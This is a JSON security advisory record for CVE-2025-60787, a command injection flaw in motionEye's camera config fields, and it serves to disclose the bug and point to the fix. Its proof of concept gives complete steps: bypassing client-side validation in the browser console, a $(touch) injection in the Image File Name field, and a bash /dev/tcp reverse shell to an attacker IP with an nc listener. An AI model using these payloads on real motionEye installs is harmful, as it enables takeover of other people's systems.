{
  "Severity": "HIGH",
  "UpdatedAt": "2025-11-03T21:48:21Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "motioneye"
  },
  "Advisory": {
    "DatabaseId": 320085,
    "Id": "GSA_kwCzR0hTQS1qOTQ1LXFtNTgtNGdqeM4ABOJV",
    "GhsaId": "GHSA-j945-qm58-4gjx",
    "References": [
      {
        "Url": "https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-60787"
      },
      {
        "Url": "https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter"
      },
      {
        "Url": "https://github.com/advisories/GHSA-j945-qm58-4gjx"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-j945-qm58-4gjx"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-60787"
      }
    ],
    "Description": "## Summary\nA command injection vulnerability in MotionEye allows attackers to achieve Remote Code Execution (RCE) by supplying malicious values in configuration fields exposed via the Web UI. Because MotionEye writes user-supplied values directly into Motion configuration files without sanitization, attackers can inject shell syntax that is executed when the Motion process restarts. This issue enables full takeover of the MotionEye container and potentially the host environment (depending on container privileges).\n\n## Details\n### Root Cause:\nMotionEye accepts arbitrary strings from fields such as **image_file_name**  and **movie_filename** in the Web UI. These are written directly into **/etc/motioneye/camera-*.conf**. When MotionEye restarts the Motion service (motionctl.start), the Motion binary reads this configuration. Because Motion treats these fields as shell-expandable, injected characters (e.g. $(), backticks) are interpreted as shell commands.\n\n### Vulnerability flow:\nDashboard (Web UI)\n   ↓\nConfigHandler.set_config()\n   ↓\ncamera-*.conf written\n   ↓\nmotionctl.restart()\n   ↓\nMotion parses config → executes payload\n\n\n### Affected code:\nThe issue arises in how config.py handles user input before writing to config files. No sanitization or allowlisting is applied to filename fields.\n\n\n### Proof of Concept (PoC)\n\nThe following steps reproduce the Remote Code Execution (RCE) vulnerability in MotionEye.  \nTested using the official Docker image.\n\n---\n\n#### Environment Setup\n1. **Start MotionEye container**  \n   Launch the vulnerable container:  \n   ```bash\n   docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge\n   ```\n\n2. **Verify version**  \n   Confirm the running version inside logs:  \n   ```bash\n   docker logs motioneye | grep \"motionEye server\"\n   ```  \n   **Result:**  \n   ```\n   motionEye server 0.43.1b4\n   ```\n    \u003cimg width=\"741\" height=\"168\" alt=\"version_ver\" src=\"https://github.com/user-attachments/assets/ac85d238-da7f-4274-9381-0119c01a1320\" /\u003e\n\n3. **Container shell access (for verification later)**  \n   Keep a shell handy to verify results:  \n   ```bash\n   docker exec -it motioneye /bin/bash\n   ls -la /tmp\n   ```\n\n---\n\n#### Exploitation Steps\n4. **Access Web Interface**  \n   - Open browser at: `http://127.0.0.1:9999`  \n   - Login with default credentials: **admin** / *(blank password)*  \n   - Add a sample RTSP network camera (required to enable camera-specific settings).\n    \n    \u003cimg width=\"1623\" height=\"869\" alt=\"add_camera\" src=\"https://github.com/user-attachments/assets/d506a891-8b80-4b69-84f2-b195fcaca0cc\" /\u003e\n\n5. **Attempt malicious filename input**  \n   - Go to: **Camera Settings → Still Images**  \n   - In the **Image File Name** field, try:  \n     ```bash\n     $(touch /tmp/test).%Y-%m-%d-%H-%M-%S\n     ```  \n   - **Observation:** This is blocked by client-side validation in the browser.\n    \n    \u003cimg width=\"739\" height=\"104\" alt=\"er1\" src=\"https://github.com/user-attachments/assets/817549fc-5cb2-4959-b29d-5cec745e096b\" /\u003e\n    \n    \u003cimg width=\"611\" height=\"90\" alt=\"er2\" src=\"https://github.com/user-attachments/assets/a68eec73-bade-4cc5-b65b-4fc2dfbc7f01\" /\u003e\n\n6. **Client-Side Validation Discovery**  \n   - The check is implemented in JavaScript:  \n     - `/static/js/main.js?v=0.43.1b4` → references `/static/js/ui.js?v=0.43.1b4`  \n   - Example validation function:  \n     ```javascript\n     function configUiValid() {\n       $('div.settings').find('.validator').each(function () { this.validate(); });\n       var valid = true;\n       $('div.settings input, select').each(function () {\n         if (this.invalid) { valid = false; return false; }\n       });\n       return valid;\n     }\n     ```\n\n7. **Bypass Validation**  \n   - Open browser console (**F12 → Console tab**)  \n   - Override the function to always return true:  \n     ```javascript\n     configUiValid = function() { return true; };\n     ```  \n   - This bypasses client-side validation and allows arbitrary values.\n    \u003cimg width=\"819\" height=\"539\" alt=\"bypass\" src=\"https://github.com/user-attachments/assets/c18d50cf-1f41-4f31-a23b-23ade9babaa2\" /\u003e\n\n8. **Inject Payload**  \n   - Set **Capture Mode**: `Interval Snapshots`  \n   - Set **Interval**: `10`  \n   - Set **Image File Name** to the payload:  \n     ```bash\n     $(touch /tmp/test).%Y-%m-%d-%H-%M-%S\n     ```  \n   - Click **Apply** to save settings.\n    \u003cimg width=\"565\" height=\"344\" alt=\"inject_payload\" src=\"https://github.com/user-attachments/assets/f23e76b2-6af3-490d-bce3-60ac3f96241e\" /\u003e\n\n9. **Verify Execution**  \n   - Inside the container shell:  \n     ```bash\n     ls -la /tmp\n     ```  \n   - **Result:** File `/tmp/test` is created with root permissions, confirming code execution.\n    \u003cimg width=\"554\" height=\"164\" alt=\"verify\" src=\"https://github.com/user-attachments/assets/11122ba8-becf-4657-bc87-f88f293e8b02\" /\u003e\n\n---\n\n#### Weaponizing RCE (Reverse Shell Example)\n10. **Start attacker listener**  \n    ```bash\n    nc -lvnp 4444\n    ```\n\n11. **Inject reverse shell payload**  \n    Enter the following into the **Image File Name** field:  \n    ```bash\n    $(python3 -c \"import os;os.system('bash -c \\\"bash -i \u003e\u0026 /dev/tcp/192.168.0.108/4444 0\u003e\u00261\\\"')\").%Y-%m-%d-%H-%M-%S\n    ```\n\n12. **Result**  \n    - A reverse shell connects back to the attacker’s machine.  \n    - Attacker gains full control of the MotionEye container environment.\n    \u003cimg width=\"1140\" height=\"366\" alt=\"final\" src=\"https://github.com/user-attachments/assets/2a8f650f-68f3-43b2-8594-08d5035c16b9\" /\u003e\n\n---\n\n#### Root Cause\n- MotionEye writes unsanitized values (e.g., `image_file_name`) from the Web UI directly into `camera-\u003cid\u003e.conf`.  \n- On restart, the `motion` binary parses these fields as shell-expandable strings, leading to arbitrary command execution.  \n\n## Impact\nType: OS Command Injection → Remote Code Execution\n\nWho is impacted:\n\n1. Any MotionEye deployment where attackers can authenticate as admin (or where the UI is left exposed with default/no password).\n2. Containerized and bare-metal installs alike.\n\nPotential consequences:\n\n1. Full compromise of MotionEye container.\n2. Lateral movement or host compromise if the container runs with privileged permissions or mounts sensitive host volumes.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-11-03T21:48:19Z",
    "Severity": "HIGH",
    "Summary": "motionEye vulnerable to RCE via unsanitized motion config parameter",
    "UpdatedAt": "2025-11-03T21:48:21Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.2,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.43.1b5"
      },
      "VulnerableVersionRange": "\u003c 0.43.1b5"
    }
  ]
}